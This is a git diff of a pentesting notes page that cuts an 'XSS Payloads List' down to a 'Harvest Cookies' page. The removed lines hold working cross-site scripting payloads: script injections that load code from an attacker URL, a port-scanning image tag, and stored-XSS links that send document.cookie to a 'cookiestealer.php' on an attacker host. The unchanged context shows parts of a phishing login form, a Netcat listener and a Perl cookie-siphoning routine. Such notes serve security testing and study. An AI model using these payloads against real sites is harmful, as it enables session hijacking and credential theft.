@@ -1,100 +1,8 @@
-# XSS Payloads List
+# Harvest Cookies
 
-Search Tag(s): #helpers
+Search Tag(s): #helpers #xss
 
-Note: JavaScript and HTML code snippets are case insensitive.
-
-## Prefix
-
-```
->
-'>
-">
-```
-
-## Javascript Cookie Properties
-
-```
-document.cookie
-window.origin
-document.cookie
-```
-
-## Detection
-
-### HTML attributes
-
-TODO: Fill in the rest
-
-|Headings|Text Formats|Escaping Special Characters|
-|--------|------------|---------------------------|
-|`<h1>header 1</h1>`|`<i>italic text</i>`|`&` -> `&amp;`|
-|`<h2>header 2</h2>`|`<em>emphasis italic text tag</em>`|`<` -> `&lt;`|
-|`<h3>header 3</h3>`|`<b>bold text</b>`|`>` -> `&gt;`|
-|`<h4>header 4</h4>`|`<strong>bold text</strong>`|`"` -> `&quot;`|
-|`<h5>header 5</h5>`|`<small>small text</small>`|`'` -> `&#x27;`|
-|`<h6>header 6</h6>`|`<sub>subscripted text</sub>`|`/` -> `&#x2F;` |
-||`<sup>superscripted text</sup>`|`©` -> `&copy`|
-||`<del>this text is deleted</del>`|`™` -> `&trade;`|
-|||`®` -> `&reg;`|
-
-### Javascript
-
-- Pop-up message
-
-```
-<script>alert(1)</script>
-<script>print()</script>
-<img src="" onerror=alert(1)>
-<svg src="" onerror=alert(1)>
-<iframe src="" onerror=alert(1)>
-<input autofocus onfocus="setTimeout(function() {alert(1)}, 5000);"></input><;/style<;/title<;/textarea<;/script>
-```
-
-## Attack Vector
-
-### Port Scanning
-
-```
-<img src="http://[::]:8000/image.jpg"><img>
-```
-
-### HTML Attributes
-
-- A list of payloads to inject links
-
-```
-<script>document.location="http[s]://<attacker_URL>/script.js"</script>
-<script>window.location="http[s]://<attacker_URL>/script.js"</script>
-<script src="http[s]://<attacker_URL>/script.js"></script>
-<img src="http[s]://<attacker_URL>/script.js">
-<svg src="http[s]://<attacker_URL>/script.js">
-<iframe src="http[s]://<attacker_URL>/script.js">
-```
-
-### Inject JavaScript Code
-
-- XSS DOM object
-
-```
-http[s]://<IP>/index.php?<parameter_id>=<script>window.onload=function(){document.getElementsByName('<html_attribute_field>')[0].innerHTML='XSS is easy!';document.getElementById('<html_ID_attribute>').submit();}</script>
-
-http[s]://<IP>/index.php?page=<script>window.onload=function(){document.getElementsByName('comment')[0].innerHTML='XSS is easy!';document.getElementById('post').submit();}</script>
-```
-
-- For stored XSS
-
-```
-<a href="https://www.google.com/search?q=what+is+xss" onmouseover="window.location='http[s]://<attacker_URL>/cookiestealer.php='+escape(document.cookie)"What is XSS?
-
-<a href="https://www.google.com/search?q=what+is+xss" onmouseover="window.location='http[s]://<attacker_URL>/cookiestealer.php?cookie='+escape(document.cookie)"What is XSS?
-```
-
-### Phishing Templates
-
-#### Harvest Cookies
-
-##### Client Side
+## 01 - Client Side
 
 - Phishing Form
 
@@ -139,7 +47,7 @@ document.write('<h3>Login to continue</h3>
 <div><h3>Login to continue</h3> <input type="text" placeholder="Username"><input type="text" placeholder="Password"><input type="submit" value="Login"><br><br></div>
 ```
 
-##### Server Side
+## 02 - Server Side
 
 - Netcat listener
 
@@ -239,31 +147,9 @@ sub siphon_cookies {
 }
 ```
 
-#### ClickJacking
-
-TODO: Fill this info
-
-#### Malvertising
-
-TODO: Fill this info
-
 ---
 ## References
-
-- [Wikipedia: List of XML and HTLM character entity references](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)
-
-- [PayloadBox: XSS Payload List](https://github.com/payloadbox/xss-payload-list)
-
-- [10 Practical scenarios for XSS attacks](https://pentest-tools.com/blog/xss-attacks-practical-scenarios)
-
-- [Cobalt: A Pentester’s Guide to Cross-Site Scripting (XSS)](https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss)
-
-- [Geeky much: Cross-site Scripting](https://medium.com/secure-you/cross-site-scripting-b64f440ae060)
 
 - [Computer Security Student (CSS): Perl XSS Cookie Stealer](http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson13/logit.pl.TXT)
 
 - [Step 20: Cross-Site Scripting (XSS)](https://medium.com/@joshthedev/step-20-cross-site-scripting-xss-1df10ff7fd12)
-
-- [XSS Phishing for Fun and Credentials!](https://www.doyler.net/security-not-included/xss-phishing)
-
-- [XSS Attack Chain – Reflected XSS -> CSRF -> Stored XSS](https://www.doyler.net/security-not-included/xss-attack-chain)
